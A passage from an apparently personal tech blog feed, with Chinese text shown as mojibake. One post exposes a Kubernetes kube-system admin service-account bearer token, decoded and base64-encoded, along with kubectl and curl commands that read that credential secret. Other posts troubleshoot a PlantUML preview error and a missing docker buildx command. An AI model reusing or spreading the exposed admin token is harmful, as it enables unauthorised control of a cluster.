eyJhbGciOiJSUzI1NiIsImtpZCI6Im9IQXYtZkpERlB0V0JHRnFwa2w1czR1Zzhja2lRWTU1cjhpWW1uaEo3cmsifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJhZG1pbi10b2tlbi0ycWRzeiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50Lm5hbWUiOiJhZG1pbiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjRmZTk1Mzk2LTZkZTgtNDA5Ny05ZmY5LTQyMzJmMDE1MWM3MSIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDprdWJlLXN5c3RlbTphZG1pbiJ9.Xsd8Oo4EYEe3eL4GQweDvnuEfsRoFF0O1RXo_HjACgsj8FMQtU2TdaBhaJk3p7Rvuc_gAz3FqJS9YOWHVlSQKqfL68RCEPfbqb-dXqnKuijFyUKD4NyhnQH42oMf9fWD0NuquhTlNASQSIXdl1WW0u0bY8cOxmQHOOIJvuHMeqLTLG3oQYSgdjdfhHUtrqF1EztORGQKYFoJEv0gZRnXhuUC30MNjVptKPPC8hEzGWaVkcMwTJVIYQ6IYWsoH3o9Z_kDveJpbiOwQO4bV39bfNuefuGZY2SoJTfnyz7ERdT7LZLZ153E14vFbxeaF-_ITD-7cSGqxLZNifv-fmSKzQ   <br><br><br><br><br><span class="hljs-comment"># æ³¨æ„ï¼štokenæ˜¯base64è§£ç åçš„å€¼</span><br><span class="hljs-comment"># kubectl -n kube-system get secret admin-token-2qdsz -o jsonpath=&#123;.data.token&#125;|base64 -d</span><br><span class="hljs-comment"># kubectl -n kube-system get secret admin-token-2qdsz -o jsonpath=&#123;.data.token&#125;|base64 --decode</span><br>eyJhbGciOiJSUzI1NiIsImtpZCI6Im9IQXYtZkpERlB0V0JHRnFwa2w1czR1Zzhja2lRWTU1cjhpWW1uaEo3cmsifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJhZG1pbi10b2tlbi0ycWRzeiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50Lm5hbWUiOiJhZG1pbiIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjRmZTk1Mzk2LTZkZTgtNDA5Ny05ZmY5LTQyMzJmMDE1MWM3MSIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDprdWJlLXN5c3RlbTphZG1pbiJ9.Xsd8Oo4EYEe3eL4GQweDvnuEfsRoFF0O1RXo_HjACgsj8FMQtU2TdaBhaJk3p7Rvuc_gAz3FqJS9YOWHVlSQKqfL68RCEPfbqb-dXqnKuijFyUKD4NyhnQH42oMf9fWD0NuquhTlNASQSIXdl1WW0u0bY8cOxmQHOOIJvuHMeqLTLG3oQYSgdjdfhHUtrqF1EztORGQKYFoJEv0gZRnXhuUC30MNjVptKPPC8hEzGWaVkcMwTJVIYQ6IYWsoH3o9Z_kDveJpbiOwQO4bV39bfNuefuGZY2SoJTfnyz7ERdT7LZLZ153E14vFbxeaF-_ITD-7cSGqxLZNifv-fmSKzQ<br><br><br><br><br><span class="hljs-comment"># æ³¨æ„ï¼štokenæ˜¯base64ç¼–ç åçš„å€¼</span><br><span class="hljs-comment"># kubectl -n kube-system get secret admin-token-2qdsz -o jsonpath=&#123;.data.token&#125;</span><br>ZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWkNJNkltOUlRWFl0WmtwRVJsQjBWMEpIUm5Gd2EydzFjelIxWnpoamEybFJXVFUxY2pocFdXMXVhRW8zY21zaWZRLmV5SnBjM01pT2lKcmRXSmxjbTVsZEdWekwzTmxjblpwWTJWaFkyTnZkVzUwSWl3aWEzVmlaWEp1WlhSbGN5NXBieTl6WlhKMmFXTmxZV05qYjNWdWRDOXVZVzFsYzNCaFkyVWlPaUpyZFdKbExYTjVjM1JsYlNJc0ltdDFZbVZ5Ym1WMFpYTXVhVzh2YzJWeWRtbGpaV0ZqWTI5MWJuUXZjMlZqY21WMExtNWhiV1VpT2lKaFpHMXBiaTEwYjJ0bGJpMHljV1J6ZWlJc0ltdDFZbVZ5Ym1WMFpYTXVhVzh2YzJWeWRtbGpaV0ZqWTI5MWJuUXZjMlZ5ZG1salpTMWhZMk52ZFc1MExtNWhiV1VpT2lKaFpHMXBiaUlzSW10MVltVnlibVYwWlhNdWFXOHZjMlZ5ZG1salpXRmpZMjkxYm5RdmMyVnlkbWxqWlMxaFkyTnZkVzUwTG5WcFpDSTZJalJtWlRrMU16azJMVFprWlRndE5EQTVOeTA1Wm1ZNUxUUXlNekptTURFMU1XTTNNU0lzSW5OMVlpSTZJbk41YzNSbGJUcHpaWEoyYVdObFlXTmpiM1Z1ZERwcmRXSmxMWE41YzNSbGJUcGhaRzFwYmlKOS5Yc2Q4T280RVlFZTNlTDRHUXdlRHZudUVmc1JvRkYwTzFSWG9fSGpBQ2dzajhGTVF0VTJUZGFCaGFKazNwN1J2dWNfZ0F6M0ZxSlM5WU9XSFZsU1FLcWZMNjhSQ0VQZmJxYi1kWHFuS3VpakZ5VUtENE55aG5RSDQyb01mOWZXRDBOdXF1aFRsTkFTUVNJWGRsMVdXMHUwYlk4Y094bVFIT09JSnZ1SE1lcUxUTEczb1FZU2dkamRmaEhVdHJxRjFFenRPUkdRS1lGb0pFdjBnWlJuWGh1VUMzME1OalZwdEtQUEM4aEV6R1dhVmtjTXdUSlZJWVE2SVlXc29IM285Wl9rRHZlSnBiaU93UU80YlYzOWJmTnVlZnVHWlkyU29KVGZueXo3RVJkVDdMWkxaMTUzRTE0dkZieGVhRi1fSVRELTdjU0dxeExaTmlmdi1mbVNLelE=<br><br><span class="hljs-comment"># æ³¨æ„ï¼štokenæ˜¯base64ç¼–ç åçš„å€¼</span><br><span class="hljs-comment"># curl -X GET $APISERVER/api/v1/namespaces/kube-system/secrets/admin-token-2qdsz --header &quot;Authorization: Bearer $TOKEN&quot; --insecure</span><br>&#123;<br>  <span class="hljs-string">&quot;kind&quot;</span>: <span class="hljs-string">&quot;Secret&quot;</span>,<br>  <span class="hljs-string">&quot;apiVersion&quot;</span>: <span class="hljs-string">&quot;v1&quot;</span>,<br>  <span class="hljs-string">&quot;metadata&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;admin-token-2qdsz&quot;</span>,<br>    <span class="hljs-string">&quot;namespace&quot;</span>: <span class="hljs-string">&quot;kube-system&quot;</span>,<br>    <span class="hljs-string">&quot;selfLink&quot;</span>: <span class="hljs-string">&quot;/api/v1/namespaces/kube-system/secrets/admin-token-2qdsz&quot;</span>,<br>    <span class="hljs-string">&quot;uid&quot;</span>: <span class="hljs-string">&quot;41e80ab2-3840-4cde-bad8-cdad915bbcc9&quot;</span>,<br>    <span class="hljs-string">&quot;resourceVersion&quot;</span>: <span class="hljs-string">&quot;2962635&quot;</span>,<br>    <span class="hljs-string">&quot;creationTimestamp&quot;</span>: <span class="hljs-string">&quot;2022-05-07T03:41:41Z&quot;</span>,<br>    <span class="hljs-string">&quot;annotations&quot;</span>: &#123;<br>      <span class="hljs-string">&quot;kubernetes.io/service-account.name&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,<br>      <span class="hljs-string">&quot;kubernetes.io/service-account.uid&quot;</span>: <span class="hljs-string">&quot;4fe95396-6de8-4097-9ff9-4232f0151c71&quot;</span><br>    &#125;,<br>    <span class="hljs-string">&quot;managedFields&quot;</span>: [<br>      &#123;<br>        <span class="hljs-string">&quot;manager&quot;</span>: <span class="hljs-string">&quot;kube-controller-manager&quot;</span>,<br>        <span class="hljs-string">&quot;operation&quot;</span>: <span class="hljs-string">&quot;Update&quot;</span>,<br>        <span class="hljs-string">&quot;apiVersion&quot;</span>: <span class="hljs-string">&quot;v1&quot;</span>,<br>        <span class="hljs-string">&quot;time&quot;</span>: <span class="hljs-string">&quot;2022-05-07T03:41:41Z&quot;</span>,<br>        <span class="hljs-string">&quot;fieldsType&quot;</span>: <span class="hljs-string">&quot;FieldsV1&quot;</span>,<br>        <span class="hljs-string">&quot;fieldsV1&quot;</span>: &#123;<span class="hljs-string">&quot;f:data&quot;</span>:&#123;<span class="hljs-string">&quot;.&quot;</span>:&#123;&#125;,<span class="hljs-string">&quot;f:ca.crt&quot;</span>:&#123;&#125;,<span class="hljs-string">&quot;f:namespace&quot;</span>:&#123;&#125;,<span class="hljs-string">&quot;f:token&quot;</span>:&#123;&#125;&#125;,<span class="hljs-string">&quot;f:metadata&quot;</span>:&#123;<span class="hljs-string">&quot;f:annotations&quot;</span>:&#123;<span class="hljs-string">&quot;.&quot;</span>:&#123;&#125;,<span class="hljs-string">&quot;f:kubernetes.io/service-account.name&quot;</span>:&#123;&#125;,<span class="hljs-string">&quot;f:kubernetes.io/service-account.uid&quot;</span>:&#123;&#125;&#125;&#125;,<span class="hljs-string">&quot;f:type&quot;</span>:&#123;&#125;&#125;<br>      &#125;<br>    ]<br>  &#125;,<br>  <span class="hljs-string">&quot;data&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;ca.crt&quot;</span>: <span class="hljs-string">&quot;LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUR2akNDQXFhZ0F3SUJBZ0lVTVBFY1pDb3graHJPMlJzNk1oblNmTndzV3lJd0RRWUpLb1pJaHZjTkFRRUwKQlFBd1pURUxNQWtHQTFVRUJoTUNRMDR4RURBT0JnTlZCQWdUQjBKbGFVcHBibWN4RURBT0JnTlZCQWNUQjBKbAphVXBwYm1jeEREQUtCZ05WQkFvVEEyczRjekVQTUEwR0ExVUVDeE1HVTNsemRHVnRNUk13RVFZRFZRUURFd3ByCmRXSmxjbTVsZEdWek1CNFhEVEl4TVRJeE16QXlOVEV3TUZvWERUSTJNVEl4TWpBeU5URXdNRm93WlRFTE1Ba0cKQTFVRUJoTUNRMDR4RURBT0JnTlZCQWdUQjBKbGFVcHBibWN4RURBT0JnTlZCQWNUQjBKbGFVcHBibWN4RERBSwpCZ05WQkFvVEEyczRjekVQTUEwR0ExVUVDeE1HVTNsemRHVnRNUk13RVFZRFZRUURFd3ByZFdKbGNtNWxkR1Z6Ck1JSUJJakFOQmdrcWhraUc5dzBCQVFFRkFBT0NBUThBTUlJQkNnS0NBUUVBeVBsTmJlT2loa1Q0ZHZPVjBxT0QKbnhmSThxQUNFczV3RkZHZUUxamltcFJHZDJ2UVdEWHkwNVdJYVAzNnZrMzlNUGhXTndyVlJlTTQ1SG1VdFZMVApZZVF0TCtqZzJXNUtFVC9ENnBIRmFLalc4VG9CVHdXTUI4dFNSZ0JpTnRKRm5PTUp2Z2tZVDhqdlNTdUhnZjd1ClBvdWFLMUhrUFJYQjFpSi9OSDNQYzMwcTJBV1RmTmNFM21DYU9VMkQrWlBaWUpncGRIV0JCK1pOeHo0R1BCZjcKa2dwbSthQUdydmpzOGZMZFh5MzhhdzNwbitSWGtNNzN5M0w2dDEvbDFvQ0JKcjlQS2pVK0JVa0s1VkdORzFFNAoxQWppQVRUZ3U2S1JKRDV2SGNZeDBHRnJ3dnZDMzRwSCs2Uk1yUWtxZ2RpRlJZVVhEYi9BYjR6RzFlUmRaazArClJRSURBUUFCbzJZd1pEQU9CZ05WSFE4QkFmOEVCQU1DQVFZd0VnWURWUjBUQVFIL0JBZ3dCZ0VCL3dJQkFqQWQKQmdOVkhRNEVGZ1FVY3JvMFdxZ3l1VjJKbTlvbXd6UDlPS25scjN3d0h3WURWUjBqQkJnd0ZvQVVjcm8wV3FneQp1VjJKbTlvbXd6UDlPS25scjN3d0RRWUpLb1pJaHZjTkFRRUxCUUFEZ2dFQkFKK01HU1BvbHU4VGhkOE1jQTZjCm9EVGdGWTc1MU5RcmlXVXd5a2FBQ2xDZXY2YWp0RU1FdmFDWXZUOXhsaUUrM2lmZDlQTXlPYTB3dDlSUWhLVXIKc01WanVBcUxrWTBhbjhiTm5HeDdkc2IweThBS2JIYXlDQkVBb1ludUtiSXcxUlMvTEpTakJqa1NYS2dsN1c3SwpzNWlzTzBFRFBIS3BOM1lSN3ZiZDdzT2krOTgxTFBWMk4vb2x6TUd3VVNCSUJXTFliZHZveHY2N3JEc1YvZ1lXCjFSZklnOU9USThTVEZhM0RjcHZUNElaTHlIMFhaeisrdjRrK0NZVEptTG9mM0VibWVhQjBya2tNNTZNSFVYWFUKY3pKMi9ETmdhKzNTNU40N0RRYVUvRVlTQXpJWG05a2lYYncwbWZoNnJFcjhHQm9DQzRBWTVOcUJWWUhETjQ1MQpzdG89Ci0tLS0tRU5EIENFUlRJRklDQVRFLS0tLS0K&quot;</span>,<br>    <span class="hljs-string">&quot;namespace&quot;</span>: <span class="hljs-string">&quot;a3ViZS1zeXN0ZW0=&quot;</span>,<br>    <span class="hljs-string">&quot;token&quot;</span>: <span class="hljs-string">&quot;ZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWkNJNkltOUlRWFl0WmtwRVJsQjBWMEpIUm5Gd2EydzFjelIxWnpoamEybFJXVFUxY2pocFdXMXVhRW8zY21zaWZRLmV5SnBjM01pT2lKcmRXSmxjbTVsZEdWekwzTmxjblpwWTJWaFkyTnZkVzUwSWl3aWEzVmlaWEp1WlhSbGN5NXBieTl6WlhKMmFXTmxZV05qYjNWdWRDOXVZVzFsYzNCaFkyVWlPaUpyZFdKbExYTjVjM1JsYlNJc0ltdDFZbVZ5Ym1WMFpYTXVhVzh2YzJWeWRtbGpaV0ZqWTI5MWJuUXZjMlZqY21WMExtNWhiV1VpT2lKaFpHMXBiaTEwYjJ0bGJpMHljV1J6ZWlJc0ltdDFZbVZ5Ym1WMFpYTXVhVzh2YzJWeWRtbGpaV0ZqWTI5MWJuUXZjMlZ5ZG1salpTMWhZMk52ZFc1MExtNWhiV1VpT2lKaFpHMXBiaUlzSW10MVltVnlibVYwWlhNdWFXOHZjMlZ5ZG1salpXRmpZMjkxYm5RdmMyVnlkbWxqWlMxaFkyTnZkVzUwTG5WcFpDSTZJalJtWlRrMU16azJMVFprWlRndE5EQTVOeTA1Wm1ZNUxUUXlNekptTURFMU1XTTNNU0lzSW5OMVlpSTZJbk41YzNSbGJUcHpaWEoyYVdObFlXTmpiM1Z1ZERwcmRXSmxMWE41YzNSbGJUcGhaRzFwYmlKOS5Yc2Q4T280RVlFZTNlTDRHUXdlRHZudUVmc1JvRkYwTzFSWG9fSGpBQ2dzajhGTVF0VTJUZGFCaGFKazNwN1J2dWNfZ0F6M0ZxSlM5WU9XSFZsU1FLcWZMNjhSQ0VQZmJxYi1kWHFuS3VpakZ5VUtENE55aG5RSDQyb01mOWZXRDBOdXF1aFRsTkFTUVNJWGRsMVdXMHUwYlk4Y094bVFIT09JSnZ1SE1lcUxUTEczb1FZU2dkamRmaEhVdHJxRjFFenRPUkdRS1lGb0pFdjBnWlJuWGh1VUMzME1OalZwdEtQUEM4aEV6R1dhVmtjTXdUSlZJWVE2SVlXc29IM285Wl9rRHZlSnBiaU93UU80YlYzOWJmTnVlZnVHWlkyU29KVGZueXo3RVJkVDdMWkxaMTUzRTE0dkZieGVhRi1fSVRELTdjU0dxeExaTmlmdi1mbVNLelE=&quot;</span>   <span class="hljs-comment"># base64ç¼–ç åçš„</span><br>  &#125;,<br>  <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;kubernetes.io/service-account-token&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>å‚è€ƒï¼š<br><a href="https://jimmysong.io/kubernetes-handbook/guide/auth-with-kubeconfig-or-token.html#%E7%94%9F%E6%88%90kubernetes%E9%9B%86%E7%BE%A4%E6%9C%80%E9%AB%98%E6%9D%83%E9%99%90admin%E7%94%A8%E6%88%B7%E7%9A%84token">ä½¿ç”¨ kubeconfig æˆ– token è¿›è¡Œç”¨æˆ·èº«ä»½è®¤è¯</a><br><a href="https://support.huaweicloud.com/api-cce/cce_02_0045.html">è·å–Secretä¿¡æ¯</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€vscodeã€‘(202402) plantumlæ— æ³•æ­£å¸¸æ˜¾ç¤ºé¢„è§ˆ</title>
    <link href="/2024/02/21/software/%E3%80%90vscode%E3%80%91(202402)%20plantuml%E6%97%A0%E6%B3%95%E6%AD%A3%E5%B8%B8%E6%98%BE%E7%A4%BA%E9%A2%84%E8%A7%88/"/>
    <url>/2024/02/21/software/%E3%80%90vscode%E3%80%91(202402)%20plantuml%E6%97%A0%E6%B3%95%E6%AD%A3%E5%B8%B8%E6%98%BE%E7%A4%BA%E9%A2%84%E8%A7%88/</url>
    
    <content type="html"><![CDATA[<h1 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h1><figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs fsharp"><span class="hljs-literal">Error</span><span class="hljs-operator">:</span> plantuml.jar file <span class="hljs-built_in">not</span> found<span class="hljs-operator">:</span> &quot;&quot;<br><br>Please download plantuml.jar from https<span class="hljs-operator">:</span><span class="hljs-comment">//plantuml.com/download.  </span><br><br><br>If you are <span class="hljs-built_in">using</span> VSCode <span class="hljs-keyword">or</span> coc.nvim, <span class="hljs-keyword">then</span> please <span class="hljs-built_in">set</span> the setting <span class="hljs-string">&quot;markdown-preview-enhanced.plantumlJarPath&quot;</span> <span class="hljs-keyword">to</span> the absolute path <span class="hljs-keyword">of</span> plantuml.jar file.<br><br>If you don&#x27;t want <span class="hljs-keyword">to</span> <span class="hljs-keyword">use</span> plantuml.jar, <span class="hljs-keyword">then</span> you can <span class="hljs-keyword">use</span> the online plantuml server <br>by setting the setting <span class="hljs-string">&quot;markdown-preview-enhanced.plantumlServer&quot;</span> <span class="hljs-keyword">to</span> the URL <span class="hljs-keyword">of</span> the online plantuml server, <span class="hljs-keyword">for</span> example<span class="hljs-operator">:</span> https<span class="hljs-operator">:</span><span class="hljs-comment">//kroki.io/plantuml/svg/</span><br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plantuml">@startuml <br>title æ ‡é¢˜<br>participant &quot;a&quot; as a<br>participant &quot;b&quot; as b<br><br>-&gt; a : 123<br>a -&gt; b: 321<br><br>@enduml<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240221095215.png" alt="image.png"></p><h1 id="è§£å†³"><a href="#è§£å†³" class="headerlink" title="è§£å†³"></a>è§£å†³</h1><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240221095319.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240221095347.png" alt="image.png"></p>]]></content>
    
    
    <categories>
      
      <category>software</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€dockeré”™è¯¯è§£å†³ç³»åˆ—ã€‘ (202402) &#39;buildx&#39; is not a docker command.</title>
    <link href="/2024/02/20/k8s/%E3%80%90docker%E9%94%99%E8%AF%AF%E8%A7%A3%E5%86%B3%E7%B3%BB%E5%88%97%E3%80%91%20(202402)%20&#39;buildx&#39;%20is%20not%20a%20docker%20command./"/>
    <url>/2024/02/20/k8s/%E3%80%90docker%E9%94%99%E8%AF%AF%E8%A7%A3%E5%86%B3%E7%B3%BB%E5%88%97%E3%80%91%20(202402)%20&#39;buildx&#39;%20is%20not%20a%20docker%20command./</url>
    
    <content type="html"><![CDATA[<h1 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ~]<span class="hljs-comment"># docker buildx</span><br>docker: <span class="hljs-string">&#x27;buildx&#x27;</span> is not a docker <span class="hljs-built_in">command</span>.<br>See <span class="hljs-string">&#x27;docker --help&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ~]<span class="hljs-comment"># uname -a</span><br>Linux ningan 5.4.0-150-generic <span class="hljs-comment">#167~18.04.1-Ubuntu SMP Wed May 24 00:51:42 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</span><br>[root@ningan ~]<span class="hljs-comment"># docker version</span><br>Client:<br> Version:           20.10.21<br> API version:       1.41<br> Go version:        go1.18.1<br> Git commit:        20.10.21-0ubuntu1~18.04.3<br> Built:             Thu Apr 27 05:50:21 2023<br> OS/Arch:           linux/amd64<br> Context:           default<br> Experimental:      <span class="hljs-literal">true</span><br><br>Server:<br> Engine:<br>  Version:          20.10.21<br>  API version:      1.41 (minimum version 1.12)<br>  Go version:       go1.18.1<br>  Git commit:       20.10.21-0ubuntu1~18.04.3<br>  Built:            Thu Apr 27 05:36:22 2023<br>  OS/Arch:          linux/amd64<br>  Experimental:     <span class="hljs-literal">false</span><br> containerd:<br>  Version:          v1.6.2<br>  GitCommit:        de8046a5501db9e0e478e1c10cbcfb21af4c6b2d<br> runc:<br>  Version:          1.1.1<br>  GitCommit:        v1.1.0-20-g52de29d7<br> docker-init:<br>  Version:          0.19.0<br>  GitCommit:        <br>[root@ningan ~]<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><h1 id="è§£å†³åŠæ³•"><a href="#è§£å†³åŠæ³•" class="headerlink" title="è§£å†³åŠæ³•"></a>è§£å†³åŠæ³•</h1><h2 id="å°è¯•1ï¼šä¿®æ”¹-x2F-docker-x2F-config-json"><a href="#å°è¯•1ï¼šä¿®æ”¹-x2F-docker-x2F-config-json" class="headerlink" title="å°è¯•1ï¼šä¿®æ”¹~&#x2F;.docker &#x2F;config.json"></a>å°è¯•1ï¼šä¿®æ”¹~&#x2F;.docker &#x2F;config.json</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ~]<span class="hljs-comment"># mkdir ~/.docker </span><br><span class="hljs-built_in">mkdir</span>: cannot create directory â€˜/root/.dockerâ€™: File exists<br>[root@ningan ~]<span class="hljs-comment"># cd .docker/</span><br>[root@ningan .docker]<span class="hljs-comment"># ll</span><br>total 24<br>drwx------  3 root root  4096 Jan 23 14:20 ./<br>drwx------ 68 root root  4096 Feb 20 10:53 ../<br>-rw-------  1 root root   447 Jan 23 14:20 config.json<br>drwxr-xr-x 85 root root 12288 Jan 23 14:55 manifests/<br><br>[root@ningan ~]<span class="hljs-comment"># vi config.json</span><br>&#123;<br>  ...<br>  <span class="hljs-string">&quot;experimental&quot;</span>: <span class="hljs-string">&quot;enabled&quot;</span><br>&#125;<br>[root@ningan .docker]<span class="hljs-comment"># docker buildx version</span><br>docker: <span class="hljs-string">&#x27;buildx&#x27;</span> is not a docker <span class="hljs-built_in">command</span>.<br>See <span class="hljs-string">&#x27;docker --help&#x27;</span><br>[root@ningan .docker]<span class="hljs-comment"># docker version</span><br>Client:<br> Version:           20.10.21<br> API version:       1.41<br> Go version:        go1.18.1<br> Git commit:        20.10.21-0ubuntu1~18.04.3<br> Built:             Thu Apr 27 05:50:21 2023<br> OS/Arch:           linux/amd64<br> Context:           default<br> Experimental:      <span class="hljs-literal">true</span><br><br>Server:<br> Engine:<br>  Version:          20.10.21<br>  API version:      1.41 (minimum version 1.12)<br>  Go version:       go1.18.1<br>  Git commit:       20.10.21-0ubuntu1~18.04.3<br>  Built:            Thu Apr 27 05:36:22 2023<br>  OS/Arch:          linux/amd64<br>  Experimental:     <span class="hljs-literal">false</span><br> containerd:<br>  Version:          v1.6.2<br>  GitCommit:        de8046a5501db9e0e478e1c10cbcfb21af4c6b2d<br> runc:<br>  Version:          1.1.1<br>  GitCommit:        v1.1.0-20-g52de29d7<br> docker-init:<br>  Version:          0.19.0<br>  GitCommit:        <br></code></pre></td></tr></table></figure><h2 id="å°è¯•2ï¼šexporter-DOCKER-CLI-EXPERIMENTAL-x3D-enabled"><a href="#å°è¯•2ï¼šexporter-DOCKER-CLI-EXPERIMENTAL-x3D-enabled" class="headerlink" title="å°è¯•2ï¼šexporter DOCKER_CLI_EXPERIMENTAL&#x3D;enabled"></a>å°è¯•2ï¼šexporter DOCKER_CLI_EXPERIMENTAL&#x3D;enabled</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan .docker]<span class="hljs-comment"># export DOCKER_CLI_EXPERIMENTAL=enabled</span><br>[root@ningan .docker]<span class="hljs-comment"># </span><br>[root@ningan .docker]<span class="hljs-comment"># docker buildx version</span><br>docker: <span class="hljs-string">&#x27;buildx&#x27;</span> is not a docker <span class="hljs-built_in">command</span>.<br>See <span class="hljs-string">&#x27;docker --help&#x27;</span><br>[root@ningan .docker]<span class="hljs-comment"># docker version</span><br>Client:<br> Version:           20.10.21<br> API version:       1.41<br> Go version:        go1.18.1<br> Git commit:        20.10.21-0ubuntu1~18.04.3<br> Built:             Thu Apr 27 05:50:21 2023<br> OS/Arch:           linux/amd64<br> Context:           default<br> Experimental:      <span class="hljs-literal">true</span><br><br>Server:<br> Engine:<br>  Version:          20.10.21<br>  API version:      1.41 (minimum version 1.12)<br>  Go version:       go1.18.1<br>  Git commit:       20.10.21-0ubuntu1~18.04.3<br>  Built:            Thu Apr 27 05:36:22 2023<br>  OS/Arch:          linux/amd64<br>  Experimental:     <span class="hljs-literal">false</span><br> containerd:<br>  Version:          v1.6.2<br>  GitCommit:        de8046a5501db9e0e478e1c10cbcfb21af4c6b2d<br> runc:<br>  Version:          1.1.1<br>  GitCommit:        v1.1.0-20-g52de29d7<br> docker-init:<br>  Version:          0.19.0<br>  GitCommit:   <br>[root@ningan .docker]<span class="hljs-comment"># docker info |grep Experimental</span><br>WARNING: No swap <span class="hljs-built_in">limit</span> support<br> Experimental: <span 